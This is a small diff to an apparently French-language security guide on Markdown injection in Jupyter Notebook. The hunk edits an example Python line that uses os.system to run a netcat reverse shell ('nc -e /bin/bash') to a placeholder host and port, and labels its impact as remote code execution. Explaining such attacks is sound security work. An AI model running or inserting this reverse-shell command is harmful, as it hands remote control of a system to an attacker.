@@ -26,7 +26,7 @@ Si le Markdown est utilisé dans Jupyter Notebook, tu peux exécuter du Python d
 
 ```python
 import os
-os.system("nc -e /bin/bash ATTACKER_IP ATTACKER_PORT")
+os.system("nc -e /bin/bash TON_IP TON_PORT")
 
 ➡️ **Impact :** Remote Code Execution (RCE) si le serveur exécute le Markdown dans un environnement Jupyter.  
 
